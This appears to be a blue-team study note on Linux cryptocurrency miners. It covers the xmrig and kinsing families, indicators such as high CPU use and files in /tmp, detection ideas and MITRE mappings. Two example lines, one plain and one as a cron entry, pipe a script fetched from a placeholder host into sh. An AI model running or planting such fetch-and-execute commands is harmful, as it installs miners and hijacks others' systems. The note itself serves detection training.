# Trend 10 – Linux Coinminers

Linux servers are heavily targeted for cryptocurrency mining due to their  
high availability and compute power.

---

## 🔥 Common Coinminer Families

- **xmrig**  
- **kinsing**  
- **kdevtmpfsi**  
- **kinsing.sh** scripts  

---

## 🔥 Indicators of Compromise

### 1. High CPU Usage
Coinminers often consume:
- 80–100% CPU  
- Long-running processes  

### 2. Suspicious Files in /tmp
Examples:
/tmp/kdevtmpfsi
/tmp/kinsing
/tmp/xmrig

Code

### 3. curl/wget Downloads
curl http://malicious/kinsing.sh | sh

Code

### 4. Cron Persistence
Attackers add:
*/5 * * * * curl http://malicious/miner.sh | sh

Code

---

## 🛡️ Detection Opportunities

- Monitor for high CPU usage  
- Detect mining pool connections  
- Track suspicious processes in /tmp  
- Alert on unauthorized cron jobs  

---

## 🎯 MITRE ATT&CK Mapping

- **T1496** – Resource Hijacking  
- **T1059** – Command Execution  

---

## 🧪 BTLO Relevance

Labs simulate:
- Linux persistence  
- curl/wget-based downloads  
- Coinminer execution  
